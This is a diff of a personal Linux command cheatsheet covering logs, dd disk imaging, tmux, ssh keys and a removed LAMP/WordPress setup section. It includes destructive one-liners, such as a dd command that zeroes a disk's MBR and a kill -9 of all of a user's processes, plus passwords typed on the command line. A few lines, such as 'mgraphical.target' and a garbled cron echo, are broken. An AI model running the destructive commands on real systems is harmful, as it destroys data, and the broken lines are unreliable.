@@ -44,30 +44,30 @@ COMMENT1
 ##    Table Of Contents
 ###########################################################
 ##
-#$   Information
-#$   Setup
-#$       ssh LAMP apache mysql php Wordpress
-#$       Nextcloud
-#$   Networking
-#$   Use
-#$       Sound
-#$       Video
-#$   bash info
-#$       Pipes
-#$      .bashrc
-#$          Settings
-#$          Functions
-#$          Aliases
-#$       More functions
-#$   Framebuffer
-#$   DANGER
-#$   Python Stuff
-#$   Extra Characters
-#$   GUI Control
-#$   HTML CSS Cheatsheets
-#$   Unsorted
-#$   vim
-#$
+#$    Information
+#$    Setup
+#$        ssh LAMP apache mysql php Wordpress
+#$        Nextcloud
+#$    Networking
+#$    Use
+#$        Sound
+#$        Video
+#$    bash info
+#$        Pipes
+#$       .bashrc
+#$           Settings
+#$           Functions
+#$           Aliases
+#$        More functions
+#$    Framebuffer
+#$    DANGER
+#$    Python Stuff
+#$    Extra Characters
+#$    GUI Control
+#$    HTML CSS Cheatsheets
+#$    Unsorted
+#$    vim
+#$    keywords
 #$
 ##
 ## ###########################################################
@@ -142,38 +142,38 @@ $> glxinfo                                          ## information about the Ope
 $> sudo cat /var/log/syslog                         ## Display the system log
 ##==========================================
 ##==========================================
-## System files
+## os. info. files. System files
 $> cat /etc/group                                   ## Show available groups and members of groups
 $> cat /etc/fstab                                   ## Show file system table mounted at startup
 ##==========================================
-## System logs
+## os. info. System logs
 $> cat /var/log/syslog                              ## Try other log files auth.log
 $> tail -n 20 /var/log/syslog                       ## Read last 20 entries in system logs
 $> watch -d tail /var/log/syslog                    ## Watch system logs
 ## Show all logs in /var/log
 $> find /var/log -type f -exec file {} \; | grep 'text' | cut -d' ' -f1 | sed -e's/:$//g' | grep -v '[0-9]$' | xargs tail -f
 ##==========================================
-## Check the status of services
+## os. Check the status of services
 $> service --status-all
 ##==========================================
-## Show installed but unused linux headers, image, or modules
+## packagemanager. Show installed but unused linux headers, image, or modules
 $> dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d'
 ##==========================================
-## Show drive names next to their full serial number (and disk info)
+## info. os. hardware. Show drive names next to their full serial number (and disk info)
 $> find /dev/disk/by-id -type l -printf "%l\t%f\n" | cut -b7- | sort
 ##==========================================
-## List files and directories in present directory
+## info. files. List files and directories in present directory
 $> tree -i -L 1
 ##==========================================
-## Files and directories by size
+## info. files. Files and directories by size
 $> du -sk ./* | sort -n | awk 'BEGIN{ pref[1]="K"; pref[2]="M"; pref[3]="G";} { total = total + $1; x = $1; y = 1; while( x > 1024 ) { x = (x + 1023)/1024; y++; } printf("%g%s\t%s\n",int(x*10)/10,pref[y],$2); } END { y = 1; while( total > 1024 ) { total = (total + 1023)/1024; y++; } printf("Total: %g%s\n",int(total*10)/10,pref[y]); }'
 ##==========================================
-## Resource Monitoring system in one line
+## hardware. os. Resource Monitoring system in one line
 ## DISK : disk space, MEM: memory ( mem , swap, Total) ,CPU : all information about cpu activity, LOAD : load average
 $> echo "DISK:";df  -Pl | grep -v "Filesystem" | awk '{print $5,$6}' ; echo "MEM:" ; free -mto | awk '{ print $1,$2,$3,$4 }'; echo "CPU:"; top -b -d1 -n1 | grep Cpu |  awk '{print $2,$3,$4,$5,$6,$7,$8,$9}';echo "LOAD:"; cat /proc/loadavg
 ##==========================================
 ## http://danielmiessler.com/study/lsof/
-## lsof is the Linux/Unix command with the most switches. It has so many it has to use both pluses and minuses.
+## os. files. lsof is the Linux/Unix command with the most switches. It has so many it has to use both pluses and minuses.
 ## Show all connections with -i
 $> lsof -i
 ## Pointing to a file shows what's interacting with that file
@@ -183,24 +183,24 @@ $> lsof -u USERNAME
 ## You can also use the -t with -u to kill everything a user has open
 $> kill -9 `lsof -t -u USERNAME`
 ##==========================================
-## print the directory structure from the current directory in tree format.
+## os. files. print the directory structure from the current directory in tree format.
 $> tree
 $> find ./ -type d | sed -e "s/[^-][^\/]*\//  |/g" -e "s/|\([^ ]\)/|-\1/"
 ##==========================================
-## Print sorted list of all installed packages (Debian)
+## os. packagemanager. Print sorted list of all installed packages (Debian)
 $> dpkg -l | grep '^i' | awk '{print $2}' | sort
 ##==========================================
-## List of most used commands
+## shell. os. List of most used commands
 $> history | sed 's/sudo//g'| awk '{print $2}'|sort|uniq -c|sort -rn|head -30|awk '!max{max=$1;}{r="";i=s=100*$1/max;while(i-->0)r=r"#";printf "%50s %5d %s %s",$2,$1,r,"\n";}'
 ##==========================================
-## Get creation date of a file on ext2-3-4 fs
+## os. hardware. info. filesystem. Get creation date of a file on ext2-3-4 fs
 ## Return the creation date of a file on ext2, 3, 4 filesystems, because stat command wont show it.
 $> debugfs -R  "stat <$(stat --printf=%i filename)>" /dev/sdaX | grep crtime
 ##==========================================
-## du with colored bar graph with reversed order to put the focus in the big ones.
+## info. filesystem. du with colored bar graph with reversed order to put the focus in the big ones.
 $> du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1} NR>1{r=int($1/t*c+.5); b="\033[1;31m"; for (i=0; i<r; i++) b=b"#"; printf " %5.2f%% %s\033[0m %s\n", $1/t*100, b, $2}'|tac
 ##==========================================
-## Show gui display dimensions
+## gui. Show gui display dimensions
 $> xdpyinfo | grep dimensions
 ##==========================================
 ## Get the size of all the directories in current directory (Sorted Human Readable)
@@ -407,8 +407,8 @@ $> sudo nano /etc/modules
 ## I had to install xz-utils instead of xzcat as the latter was not found
 ##==========================================
 ##==========================================
-### tmux
-https://tmuxcheatsheet.com/
+## tmux
+$> firefox https://tmuxcheatsheet.com/
 ## ctrl+b then after press; % for vertical split, " for horizontal split, arrows to move curser, x to close
 $> tmux
 ## start tmux as default, add the following lines to your ~/.bash_profile shell startup file, just above your aliases section.
@@ -419,10 +419,10 @@ $> TERM=xterm mc
 ## To write command on all the panes at once
 $> ctrl+b :setw synchonize-panes
 ##==========================================
-## Remove mbr with dd.  Fix corrupted mbr disk by zeroing it out.
+## os. hardware. Remove mbr with dd.  Fix corrupted mbr disk by zeroing it out.
 $> sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1
 ##==========================================
-## Make sd card image with dd can use bs=512 or bs=1M or  bs=4M
+## os. hardware. Make sd card image with dd can use bs=512 or bs=1M or  bs=4M
 $> dd if=/dev/sdb of=~/sdcard.dd bs=4M
 ## Change to correct /dev/
 $> dd bs=4M if=sdcard.img of=/dev/sdX conv=fsync
@@ -462,24 +462,11 @@ $> sudo systemctl stop lightdm
 ## Start gui
 $> sudo systemctl start lightdm
 ##------------------------------------------
-##==========================================
-## To disable a listed service from starting at boot try:
-$> sudo update-rc.d <service name> disable
-##==========================================
-## Set users default shell
-$> chsh -s /usr/local/bin/bash $USER
-## Provide your login password. Verify that shell is changed:
-$> grep ^$USER /etc/passwd
-## Relogin to get new shell
-##==========================================
-## https://github.com/cosmos72/
-## twin the window multiplexer is great but cn not get it to work anymore the best lost program. RIP twin
-##==========================================
-## Check your groups
-$> groups
-$> grep $USER /etc/group
-##==========================================
-## Command line only login in grub
+## os. permissions. Command line only login.
+$> sudo systemctl set-default multi-user.target
+## GUi login.
+$> sudo systemctl set-default mgraphical.target
+##------------------------------------------
 ## Change /etc/default/grub
 $> sudo sed -i 's:quiet splash:quiet text:' /etc/default/grub
 $> sudo update-grub
@@ -496,13 +483,13 @@ $> sudo reboot
 ##------------------------------------------
 ## Boot into command line only environment
 ## Press at grub for edit
-e
+$> e
 ## Change from init 5 gui mode
-$vt_handoff 5
+$> $vt_handoff 5
 ## to init 3 multi user terminal mode
-$vt_handoff 3
+$> $vt_handoff 3
 ## Start back into gui
-sudo init 5
+$> sudo init 5
 ##------------------------------------------
 ## Command line only login system service
 ## Boot to text mode.  Stop mdm service from starting automatically on systemd
@@ -512,6 +499,24 @@ $> sudo systemctl disable mdm
 $> sudo systemctl start mdm
 ## boot to gui by default
 $> sudo systemctl enable mdm
+##==========================================
+## os. services. To disable a listed service from starting at boot try:
+$> sudo update-rc.d <service name> disable
+##==========================================
+## shell. os. Set users default shell
+$> chsh -s /usr/local/bin/bash $USER
+## Provide your login password. Verify that shell is changed:
+$> grep ^$USER /etc/passwd
+## Relogin to get new shell
+##==========================================
+## os. multiplex. Twin cli multiplexer with mouse windows.
+## https://github.com/cosmos72/
+## twin the window multiplexer is great but can not get it to work anymore the best lost program. RIP twin
+##==========================================
+## os. permissions. Check your groups
+$> groups
+$> grep $USER /etc/group
+##==========================================
 ##==========================================
 ## Update ppa repository
 $> sudo add-apt-repository ppa:<repository-name>
@@ -596,10 +601,10 @@ $> sudo nano /etc/fstab
 @> sshfs#root@xxx.xxx.xxx.xxx:/ /local/mnt
 @> sshfs#$USER@xxx.xxx.xxx.xxx:/remote/path/ /local/mnt fuse auto,user,_netdev,reconnect,uid=1000,gid=1000,IdentityFile="/home/$USER/.ssh/key.pem",idmap=user,allow_other  0
 ##==========================================
-$>  sshfs name@server:/path/to/folder /path/to/mount/point
-##  Mount folder/filesystem through SSH
-##  Install SSHFS from http://fuse.sourceforge.net/sshfs.html
-##  Will allow you to mount a folder securely over a network.
+## filesystem. web. networking. Mount folder/filesystem through SSH
+## Install SSHFS from http://fuse.sourceforge.net/sshfs.html
+## Will allow you to mount a folder securely over a network.
+$> sshfs name@server:/path/to/folder /path/to/mount/point
 ##==========================================
 ## ?????????? working? Better to use sshfs.
 ## create a config file in .ssh directory.
@@ -618,23 +623,22 @@ $> ssh myec2server
 $> ssh://myec2server
 ## mount your remote ec2server into your nautilus. Now you can edit remote files and you can use the remote server as another folder in your computer. That is great.
 ##==========================================
-## Install sublime-text. Sublime is a great ext editor with context highlighting and many features
+## text. app. ide. Install sublime-text. Sublime is a great ext editor with context highlighting and many features
 $> sudo apt-get install sublime-text
-##
 ##==========================================
 ## Install xfce gui a mid size lightish gui
 $> sudo apt-get install xfce xfce-goodies
 $> sudo apt-get install mint-meta-xfce
 ##==========================================
 ## Install ffmpeg
-$> sudo add-apt-repository ppa:mc3man/trusty-media
-$> sudo apt-get update
-$> sudo apt-get install ffmpeg
+#$> sudo add-apt-repository ppa:mc3man/trusty-media
+#$> sudo apt-get update
+#$> sudo apt-get install ffmpeg
 ##==========================================
 ## Change caplock to another backspace;
 $> setxkbmap -option caps:backspace
 ##==========================================
-## Favorite nerdy, name friendly, date format %Y=year %m=month %d=day - %H=hour %M=minute %S=seconds, %F:YYYY-MM-DD, %T-HH:MM:SS, %N-NanoSeconds
+## os. date. info. Favorite nerdy, name friendly, date format %Y=year %m=month %d=day - %H=hour %M=minute %S=seconds, %F:YYYY-MM-DD, %T-HH:MM:SS, %N-NanoSeconds
 $> date +"%Y%m%d-%H:%M"
 $> date +"%Y%m%d-%H:%M:%S"
 $> date "+%F %H:%M.%S"
@@ -644,21 +648,23 @@ $> date "+%F %T.%N"
 ## UTC 24hr time.
 $> LC_TIME="C.UTF-8" ; date --utc +"%Y%m%d-%H:%M"
 ##==========================================
-## If you have a AMD or Nvidia graphics card and can not see/boot.
+## os. hardware. gpu. If you have a AMD or Nvidia graphics card and can not see/boot.
 ## During boot hold down the left shift key to get the GRUB boot menu to show.
 ## Press the 'e' key to edit the boot parameters. Add the boot parameters;
 $> quite splash $vt_handoff nomodeset xforcevesa
 ## Then put in correct driver for you card
 ##==========================================
-## Search for software to download from configured repositories
+## os. packagemanager. app. Search for software to download from configured repositories
 ## Shows available packages
 $> apt-cache search <searchterm>
 ## Shows package origin
 $> apt-cache policy <searchterm>
 ##==========================================
+## os. backup. Use dd to backup your harddrive mbr section.
 $> dd if=/dev/hda of=/mbr.backup bs=512 count=1       ## Backs up MBR Master Boot Record
 $> dd if=/mbr.backup of=/dev/hda bs=512 count=1       ## Restores MBR Master Boot Record
 ##==========================================
+## os. logs
 $> tail -f /var/log/syslog                            ## monitors messages
 ##==========================================
 ## Current color settings
@@ -670,7 +676,10 @@ $> eval $(echo "rs:global default;fi:normal file;di:directory;ln:symbolic link;p
 ## Change terminal prompt; 0;32 green
 $> export PS1="\e[0;32m\u@\h \w> \e[m"
 ##==========================================
-## Execute command periodically with cron
+## ##########################
+## ## ##    cron
+## ##########################
+## os. automation. Execute command periodically with cron
 ## ┌───────────── minute (0 - 59)
 ## │ ┌───────────── hour (0 - 23)
 ## │ │ ┌───────────── day of the month (1 - 31)
@@ -761,19 +770,14 @@ $> sudo mcedit ~/.config/mc/ini
 $> export TERM=xterm-256color # BREAKS mc in non gui tty logins
 $> mc -S sand256
 ##==========================================
-## Put a console clock in top right corner
+## shell. Put a console clock in top right corner
 $> while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
 ##==========================================
-## Turn off LCD
+## hardware. os. Turn off LCD
 $> xset dpms force standby
 $> xset dpms force off
 ##==========================================
-## Backs up MBR Master Boot Record
-$> dd if=/dev/sda of=/home/YOURUSERNAME/mbr.backup bs=512 count=1
-## Restores MBR Master Boot Record
-$> dd if=/home/YOURUSERNAME/mbr.backup of=/dev/sda bs=512 count=1
-##==========================================
-## Add a user
+## os. permissions. Add a user
 $> sudo adduser USER_NANE
 ## Delete a user
 $> sudo deluser USER_NAME
@@ -790,7 +794,7 @@ $> sudo usermod -U USER_NAME
 ## Add a user to admin group
 $> sudo usermod -G admin -a USER_NAME
 ##==========================================
-## Set apt source
+## packagemanager. os. app. Set apt source
 $> sudo software-properties-gtk
 $> sudo software-properties-kde
 ## Display the packages which are not installed but have remained residual config
@@ -838,7 +842,7 @@ $> apt-cache showpkg  PACKAGE_NAME
 ## ########################
 ## ##    ssh
 ## ########################
-## ssh secure shell
+## networking. shell. ssh secure shell
 ##------------------------------------------
 ### ssh secure shell remote
 ## Install ssh server and client
@@ -984,587 +988,7 @@ git remote set-url origin git@github.com:YOURGITHUBACCOUNT/YOURREPO.git
 ## ##    END ssh
 ## #########################
 ##==========================================
-## ###################################
-## ##    LAMP apache mysql php
-## ###################################
-##==========================================
-### ssh secure shell remote
-## Install ssh server and client
-$> sudo apt-get install openssh-server openssh-sftp-server openssh-client sshfs
-## Login to server, the server will ask for a password
-$> ssh $USER@server
-## Use -t to call a shell and cd to a particular directory
-$> ssh -t example.com "cd /foo/bar; exec \$SHELL -l"
-## Setup server
-## If you have a complelling reason chamge port from port 22 to something else.
-## Check current port
-$> cat /etc/ssh/sshd_config | grep -i Port
-## Change port to 26
-$> sudo sed -i "s/Port 22/Port 26/"
-## Login to server at port 26
-$> ssh user@192.168.1.1 -p 26
-##------------------------------------------
-## Use openssl aes rsa encryption keys to connect securely to server
-## Create keys. public keys to put on remote machines which will use that key to authenticate, and a private key you set strong permissions on, that you use to give you access to the remote.
-$> ssh-keygen -t rsa
-##   Generating public/private rsa key pair.
-##   Enter file in which to save the key (/Your/HomeDir/.ssh/id_rsa):
-##   Enter passphrase (empty for no passphrase):
-## defaults to 2048 bits, can change to higher bits with -b 4096, and -C and put in a comment
-$> ssh-keygen -t rsa -b 4096 -C 'Passwd_hint'
-## Available encryption; “dsa”, “ecdsa”, “ed25519”, “rsa”. Change the key names appropriately.
-$> ssh-keygen -t dsa
-## This will place the private key in ~/.ssh/id_rsa and the public key in ~/.ssh/id_rsa.pub.
-## Set permissions
-$> chmod 700 ~/.ssh
-$> chmod 600 ~/.ssh/id_rsa; chmod 600 ~/.ssh/id_rsa.pub
-## Do this for each
-$> mv ~/.ssh/id_rsa  ~/.ssh/servername_id_rsa; mv ~/.ssh/id_rsa.pub  ~/.ssh/servername_id_rsa.pub;
-##------------------------------------------
-### Setup on server !!!! Do not copy your private key over. !!!!
-## Transfer pub key to server:
-$> scp ~/.ssh/id_rsa.pub user@myserver.com:~/id_rsa.pub
-## in the server, add pub key to authorized_keys file
-$> cat id_rsa.pub >> ~/.ssh/authorized_keys
-## Or
-## append the contents of ~/.ssh/id_dsa.pub to the end of ~/.ssh/authorized_keys on the remote machine.
-$> cat .ssh/serername_id_rsa.pub | ssh $USER@192.168.1.101 'cat >> ~/.ssh/authorized_keys'
-## Or
-## Can use ssh-copy-id instead; the cat port technique above is more portable.
-$> ssh-copy-id
-## !!!! Do not copy your private key over. !!!!Z
-##==========================================
-## Install LAMP Web Server
-#$> sudo apt-get install apache2 mysql-server mysql-client php5 libapache2-mod-php5 php5-cli php5-gd
-## Install newer LAMP Web Server implementation with php7.0
-#$> sudo apt-get install apache2 mysql-server mysql-client php7.0 libapache2-mod-php7.0 php7.0-cli php7.0-gd libapache2-mod-php7.0 php7.0-mysql
-## Install newer LAMP Web Server implementation
-$> sudo apt install apache2 ghostscript libapache2-mod-php mysql-server php php-bcmath php-curl php-imagick php-intl php-json php-mbstring php-mysql php-xml php-zip
-## Mysql should prompt to choose a root password
-## Restart apache2
-$> sudo /etc/init.d/apache2 restart
-## or
-$> sudo sevice apache restart
-## Add permissions allow user to make content on /var/www
-$> sudo usermod -a -G www-data $USER
-$> sudo chown -R :www-data /var/www
-$> sudo chmod -R 775 /var/www
-##------------------------------------------
-## Activate Mod_Rewrites to rewrite links in apache
-## Allow apache2 to change addresses to new URLs
-## Before we begin generating the actual URL rewrites, activate the apache mod_rewrite module.
-## Add apache2 module to allow rewrites
-$> sudo a2enmod rewrite
-## Change apache2 configuration to allow rewrites
-## Use sed to change "AllowOverride None" to "AllowOverride All" in the "<Directory /var/www/>" section of /etc/apache2/apache2.conf
-$> sudo sed -i '\%^<Directory /var/www/>%,\%^</Directory>% s/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf
-## OR use a text editor
-$> sudo mcedit /etc/apache2/apache2.conf
-## Change this:
-$@<Directory /var/www/>
-$@  Options Indexes FollowSymLinks
-$@  AllowOverride None
-$@  Require all granted
-$@</Directory>
-## To this:
-$@<Directory /var/www/>
-$@  Options Indexes FollowSymLinks
-$@  AllowOverride All
-$@  Require all granted
-$@</Directory>
-## Restart apache
-$> sudo service apache2 restart
-##------------------------------------------
-## Apache has userdir module userdir which lets you use /home/USER/public_html as root directory.
-## You will access this public_html as localhost/~USER/
-## Make a public html directory in home dir
-$> mkdir ~/public_html
-## Set permissions on public_html folder allow the www-data user to see the files usually 755
-$> chmod -R 755 ~/public_html
-## Enable the userdir apache mod
-$> sudo a2enmod userdir
-$> sudo service apache2 reload
-$> w3m -dump https://httpd.apache.org/docs/2.4/howto/public_html.html
-## ?????uncomment line below in the config file conf/httpd.conf, and adapting the httpd-userdir.conf file as necessary
-## #Include conf/extra/httpd-userdir.conf
-##=======================================
-## SSL LetsEncrypt is a project designed to allow users access to free SSL certificates for their websites.
-## https://linuxconfig.org/generate-ssl-certificates-with-letsencrypt-debian-linux
-$> sudo apt-get install python-certbot-apache
-## Certbot PPA
-## https://certbot.eff.org/lets-encrypt/ubuntuxenial-apache
-$> sudo apt-get update
-$> sudo apt-get install software-properties-common
-$> sudo add-apt-repository universe
-$> sudo add-apt-repository ppa:certbot/certbot
-$> sudo apt-get update
-$> sudo apt-get install certbot python-certbot-apache
-$> sudo certbot --apache certonly
-#Enter email address (used for urgent renewal and security notices) (Enter 'c' tocancel): sflaptop@gmail.com
-#Starting new HTTPS connection (1): acme-v02.api.letsencrypt.org
-#Please read the Terms of Service at
-#https://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You must agree in order to register with the ACME server at
-#https://acme-v02.api.letsencrypt.org/directory
-## Or
-$> wget https://dl.eff.org/certbot-auto
-$> sudo mv certbot-auto /usr/bin
-$> sudo certbot --apache
-## Auto-Renew with Cron
-## Create script to renew certs
-$> sudo echo '
-##! /bin/bash
-#certbot renew -q' > /home/user/renew-certs.sh
-## Make the script executable
-$> chmod +x renew-certs.sh
-$> crontab -l
-## create a cron job that runs twice a day
-$> echo 'echo 'echo '* 3,15 * * * /home/$USER/renew-certs.sh' >> /home/$USER/.crontab
-## Add jobs to cron
-$> crontab < .crontab
-$> crontab -l
-##=========================================
-## Configure mysql from commandline
-$> mysql -u root -p -e "CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword'; CREATE DATABASE database_name; GRANT ALL PRIVILEGES ON database_name.* TO new_db_user@localhost IDENTIFIED BY 'new_db_user_pass';"
-## Function to setup mysql for wordpress
-## Setup mysql for wordpress. Usage: wordpressmysqlsetup $USER password wp_databasename
-$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
-##-----------------------------------------
-## Configure mysql manually
-$> gksudo gedit /etc/mysql/my.cnf
-## Insecure way, put password in command
-$> sudo /usr/bin/mysqladmin -u root -h localhost password 'RootPassword'
-$> sudo /usr/bin/mysqladmin -u YOURUSERNAME -h localhost password 'YourPassword'
-$> sudo /usr/bin/mysqladmin -u YOURUSERNAME -h 127.0.0.1 password 'YourPassword'
-$> sudo /usr/bin/mysqladmin -u root -h localhost password 'new-password'
-$> sudo /etc/init.d/mysql restart
-## In AWS can sign on with sudo
-$> sudo msql
-## Sign into mysql
-$> mysql -u root -h localhost -p
-$> mysql -u YOURUSERNAME -p
-$> mysql -u root -p
-## Create a database just for our new WordPress installation.
-$> mysqladmin -u root -p create databasename
-## OR in mysql shell
-$> mysql -u root -p
-## Create a database user just for our new WordPress installation.
-$> mysql> CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword';
-## At the mysql shell, type the following commands. Remember to use your own, valid values for database_name, databaseuser, and also use a strong and secure password as databaseuser_password.
-$> mysql> CREATE DATABASE wp_nameofyoursite;
-$> mysql> GRANT ALL PRIVILEGES ON wp_nameofyoursite.* TO 'your_username_here'@'localhost' IDENTIFIED BY 'your_chosen_password_here';
-$> mysql> FLUSH PRIVILEGES;
-$> mysql> EXIT;
-## OR all together from commandline
-$> mysql -u root -p -e "CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword'; CREATE DATABASE database_name; GRANT ALL PRIVILEGES ON database_name.* TO new_db_user@localhost IDENTIFIED BY 'new_db_user_pass';"
-## Function to setup mysql for wordpress
-## Setup mysql for wordpress. Usage: wordpressmysqlsetup $USER password wp_databasename
-$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
-##-----------------------------------------
-## Changing the MySQL root user password
-## In the above command, there is no space between -p and 'OLDPASSWORD'. If you put a space between them, the command will fail.
-$> mysqladmin -u root -p'OLDPASSWORD' password NEWPASSWORD
-## Remove the passwords from .bash_history and .mysql_history.
-## Put space before this command so this command does not show in the hisory and defeat the purpose.
-$>  sed -i 's/Your_Password//g' ~/.bash_history
-$>  sed -i 's/Your_Password//g' ~/.mysql_history
-##=========================================
-## PHP only allows 2MB files upload by default. For uploading bigger files to your server, increase the upload size in php.ini file.
-## search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
-## See what set to now
-## For php5
-$> cat /etc/php5/apache2/php.ini | grep "upload_max_filesize ="
-$> cat /etc/php5/apache2/php.ini | grep "post_max_size ="
-## For php7.0
-$> cat /etc/php/7.0/apache2/php.ini | grep "upload_max_filesize ="
-$> cat /etc/php/7.0/apache2/php.ini | grep "post_max_size ="
-## Change to what you want
-## For php5 to increase uploads to 20mb
-$> sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php5/apache2/php.ini
-$> sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php5/apache2/php.ini
-## For php7.0 to increase uploads to 20mb
-$> sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/7.0/apache2/php.ini
-$> sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php/7.0/apache2/php.ini
-## Or use a editor and search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
-## For php5
-$> sudo nano /etc/php5/apache2/php.ini
-## For php7.0
-$> sudo nano /etc/php/7.0/apache2/php.ini
-##==========================================
-##============================================
-## ######################################
-## ##    END LAMP apache mysql php
-## ######################################
-##==========================================
-##==========================================
-## ######################
-## ##    Wordpress
-## ######################
-##==========================================
-### Wordpress
-## Function install WordPress into current folder
-@> function installwordpress() {
-@>     gpasswd -a $USER www-data
-@>     wget http://wordpress.org/latest.tar.gz
-@>     tar xzvf latest.tar.gz
-@>     cp -rf wordpress/** ./
-@>     rm -R wordpress
-@>     cp wp-config-sample.php wp-config.php
-@>     wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/
-@>     sed -i '/#@-/r wp.keys' wp-config.php
-@>     sed -i "/#@+/,/#@-/d" wp-config.php
-@>     mkdir wp-content/uploads
-@>     find . -type d -exec chmod 755 {} \;
-@>     find . -type f -exec chmod 644 {} \;
-@>     chown -R :www-data *
-@>     chmod 640 wp-config.php
-@>     rm -f latest.tar.gz
-@>     rm -f wp.keys
-@> }
-##------------------------------------------
-## Function install WordPress into current folder oneliner
-$> function installwordpress() { gpasswd -a $USER www-data; wget http://wordpress.org/latest.tar.gz; tar xzvf latest.tar.gz; cp -rf wordpress/** ./; rm -R wordpress; cp wp-config-sample.php wp-config.php; wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/; sed -i '/#@-/r wp.keys' wp-config.php; sed -i "/#@+/,/#@-/d" wp-config.php; mkdir wp-content/uploads; find . -type d -exec chmod 755 {} \;; find . -type f -exec chmod 644 {} \;; chown -R :www-data *; chmod 640 wp-config.php; rm -f latest.tar.gz; rm -f wp.keys; }
-##------------------------------------------
-## Install WordPress
-$> cd /var/www/
-$> chown -R :www-data html
-## Add your user to group for access
-$> sudo gpasswd -a $USER www-data
-$> cd /var/www/html
-$> wget http://wordpress.org/latest.tar.gz
-## Download WordPress, modify wp-config.php, set permissions, some steps require sudo
-## Get wordpress
-$> wget http://wordpress.org/latest.tar.gz
-$> tar -xzvf latest.tar.gz
-$> cp -rf wordpress/** ./
-$> rm -R wordpress
-$> cp wp-config-sample.php wp-config.php
-## Change permissions
-$> find . -type d -exec chmod 755 {} \;
-$> find . -type f -exec chmod 644 {} \;
-$> mkdir wp-content/uploads
-$> chown -R :www-data wp-content/uploads
-$> chown -R $USER:www-data *
-$> chmod 640 wp-config.php
-## Specify database user and password.
-$> sed -i "s/database_name_here/$dbname/g" wp-config.php
-$> sed -i "s/username_here/$dbuser/g" wp-config.php
-$> sed -i "s/password_here/$dbpass/g" wp-config.php
-## Change the table prefix to something unique
-$> sed -i "s/table_prefix  = 'wp_'/table_prefix  = 'wp_uniquename_'/"  wp-config.php
-## GID is the numerical primary group ID for the user. Numeric values for GIDs are listed in /etc/group.
-$> cat /etc/group
-## Go to wordpress configuration page
-$> firefox http://ip_address/wp-admin/install.php
-## !!!!Better to use http://ip_address/wp-admin/install.php, as above, especially if in subdirectory.
-## Get salt from website and install to wp-config.php with sed. Can redo this part if you think site has been compromised. This will force everyone to re-login.
-## Setup wordpress without browser.
-$> wget -O wp.keys https://api.wordpress.org/secret-key/1.1/salt/
-$> sed -i '/#@-/r wp.keys' wp-config.php
-$> sed -i "/#@+/,/#@-/d" wp-config.php
-## Cleanup
-$> rm -f latest.tar.gz
-$> rm -f wp-install.sh
-$> rm -f wp.keys
-##==========================================
-### Export and import wordpress sites
-## Two ways to get wordpress site
-## Copy and compress total site
-$> cd /var/www
-$> tar -cvzf html_sitename_20190124.tar.gz html
-## Copy tar.gz to new server with scp or just copy by making it availables and wget from remote server
-$> scp html_sitename_20190124.tar.gz UserName@192.168.1.8:/var/www
-## On new server
-$> ssh yourname@192.168.1.8
-## If you need a .pem use -i
-$> ssh -i ./commandlinefun.pem yourname@192.168.1.8
-## Decompress total site
-$> cd /var/www
-$> tar -xvzf html_sitename_20190124.tar.gz
-$> cd /var/www/html
-## Change any references in wp-config.php to new site
-$> sed -i 's/oldaddress/newaddress/g' wp-config.php
-## OR
-## Export Wordpress xml in wordpress
-## Import Wordpress xml into wordpress on new server
-## Settings>
-##-----------------------------------------
-## Export mysql database
-## No space between -p and password
-$> mysqldump -u [uname] -p[pass] db_name > db_backup.sql
-## Example
-$> mysqldump -u Your_Username -pYour_Password wp_wordpress_database_name > wp_wordpress_database_name_backup_20190118.sql
-##-----------------------------------------
-## Create database to import into
-$> mysql -u $USER -p
-$@ mysql> SHOW DATABASES;
-$@ mysql> CREATE DATABASE wp_wordpress_database_name;
-$@ mysql> SHOW DATABASES;
-## Create a wordpress database user and grant privileges on that database
-$@ mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'newuserspassword';
-$@ mysql> GRANT ALL PRIVILEGES ON  wp_wordpress_database_name* TO 'newuser'@'localhost';
-$@ mysql> EXIT;
-## Import database into mysql
-$> mysql -u Your_Username -p -h localhost wp_wordpress_database_name < /path/to/db_backup.sql
-## Or if sudo mysql works like on AWS
-$> sudo mysql -h localhost wp_wordpress_database_name < /path/to/wp_wordpress_database_name_backup_20190118.sql
-##-----------------------------------------
-## Stop white screen of death due to redirect or change to new URL
-## Rewrite url in wordpress database
-$> mysql -u YOURUSERNAME -p
-## In mysql command  where '192.168.1.3' is old server address, and 'mynewurl.com' is new server URL. Can use an address instead.
-$@ mysql> SHOW DATABASES;
-$@ mysql> USE wp_YourWordpressDatabase;
-## Check where site is directed rename to match your system
-$@ mysql> SELECT option_value FROM wp_uniquename_options WHERE option_name = 'home' OR option_name = 'siteurl';
-## Replace with new site
-$@ mysql> UPDATE wp_uniquename_posts SET guid = replace(guid, '192.168.1.3','mynewurl.com');
-$@ mysql> UPDATE wp_uniquename_posts SET post_content = replace(post_content, '192.168.1.3', 'mynewurl.com');
